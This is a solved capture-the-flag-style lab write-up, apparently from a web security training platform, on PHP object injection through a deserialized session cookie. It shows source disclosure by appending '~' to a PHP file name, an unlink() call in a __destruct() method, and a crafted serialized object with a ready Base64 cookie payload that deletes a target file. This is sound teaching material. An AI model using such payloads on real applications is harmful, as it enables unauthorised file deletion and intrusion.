# Arbitrary Object Injection in PHP


**Lab:** Arbitrary object injection in PHP

**Difficulty:** Practitioner

**Status:** Solved

**Topic:** PHP Insecure Deserialization / Object Injection



---


## Overview



This lab uses a serialization-based session mechanism and is vulnerable to **arbitrary object injection**.




The goal is to inject a malicious serialized PHP object that causes the application to delete:



```text

/home/carlos/morale.txt

```




The lab can be solved by obtaining the application's source code, identifying a dangerous magic method, crafting a serialized object, and 
injecting it into the session cookie.



---




## 1. Understanding the Session



After logging in with:



```text

wiener:peter

```



the application stores the session as a Base64-encoded serialized PHP object.



The decoded session has a structure similar to:



```text

O:4:"User":2:{

    s:8:"username";

    s:6:"wiener";

    s:12:"access_token";

    s:32:"...";

}

```



This indicates that the application is serializing PHP objects and later deserializing data supplied through the session cookie.



---




## 2. Source Code Disclosure



The lab provides access to the source code by appending `~` to the PHP file:



```http

GET /libs/CustomTemplate.php~ HTTP/2

```



The response revealed the following class:



```php

class CustomTemplate {

    private $template_file_path;

    private $lock_file_path;




    public function __construct($template_file_path) {

        $this->template_file_path = $template_file_path;

        $this->lock_file_path = $template_file_path . ".lock";

    }



    private function isTemplateLocked() {

        return file_exists($this->lock_file_path);

    }



    public function getTemplate() {

        return file_get_contents($this->template_file_path);

    }



    public function saveTemplate($template) {

        if (!isTemplateLocked()) {

            if (file_put_contents($this->lock_file_path, "") === false) {

                throw new Exception("Could not write to " . $this->lock_file_path);

            }



            if (file_put_contents($this->template_file_path, $template) === false) {

                throw new Exception("Could not write to " . $this->template_file_path);

            }

        }

    }



    function __destruct() {

        if (file_exists($this->lock_file_path)) {

            unlink($this->lock_file_path);

        }

    }

}

```



---




## 3. Identifying the Vulnerability



The dangerous part is the destructor:



```php

function __destruct() {

    if (file_exists($this->lock_file_path)) {

        unlink($this->lock_file_path);

    }


}

```



The `unlink()` function deletes a file.



If an attacker can control:



```text

lock_file_path

```



they can potentially control which file the destructor attempts to delete.



The lab's target file is:



```text

/home/carlos/morale.txt

```



Therefore, we want:


```text

lock_file_path = /home/carlos/morale.txt

```



---



## 4. Crafting the Serialized Object



Instead of injecting the original `User` object, we inject a `CustomTemplate` object containing the required property.



The serialized object used for the lab was:



```text

O:14:"CustomTemplate":1:{

s:14:"lock_file_path";

s:23:"/home/carlos/morale.txt";

}

```



Important length values:



```text

CustomTemplate                  = 14

lock_file_path                  = 14

/home/carlos/morale.txt         = 23

```



The serialized object is then Base64-encoded because the session cookie expects Base64-encoded serialized data.



---



## 5. Base64 Payload



The resulting Base64 value was:


```text

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==

```



When placed in the HTTP cookie, the `=` characters may appear URL-encoded:


```text

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D

```



---


## 6. Exploitation



The malicious payload was placed into the session cookie:



```http

Cookie: session=<malicious_payload>

```



The application then deserialized the attacker-controlled object.



Conceptually, the object became:



```text


CustomTemplate

    |

    └── lock_file_path

            |

            └── /home/carlos/morale.txt


```



When the object was destroyed, PHP automatically invoked:




```php

__destruct()

```



which executed:



```php

unlink($this->lock_file_path);

```



Effectively:



```php

unlink("/home/carlos/morale.txt");

```




This deleted the target file and solved the lab.


---




## 7. Attack Flow


```text

Attacker-controlled session

          ↓
Base64 decode

          ↓

Serialized PHP object
          ↓


unserialize()

          ↓

CustomTemplate object

          ↓

Controlled lock_file_path

          ↓

__destruct()

          ↓

unlink()

          ↓

/home/carlos/morale.txt deleted

```




---



## Key Takeaways



* PHP serialization can become dangerous when serialized data is controlled by an attacker.

* `unserialize()` can instantiate attacker-controlled objects.

* Magic methods such as `__destruct()` may introduce exploitable behavior.


* Source code disclosure is extremely useful when analyzing PHP object injection vulnerabilities.


* Dangerous file operations such as `unlink()` become exploitable when their arguments can be influenced through object properties.

* The important skill is understanding the relationship between:

  * serialized object structure

  * class properties

  * magic methods

  * application behavior



### Key Terms





* **Serialization:** Converting data or an object into a storable/transmittable representation.

* **Deserialization:** Reconstructing the original data or object from serialized data.

* **PHP Object Injection:** Injecting attacker-controlled PHP objects through unsafe deserialization.

* **Magic Method:** A PHP method that is automatically invoked in specific situations.


* **`__destruct()`:** A magic method automatically executed when an object is destroyed.

* **`unlink()`:** A PHP function used to delete a file.

* **POP Chain:** A chain of existing classes and magic methods that can be abused during deserialization.

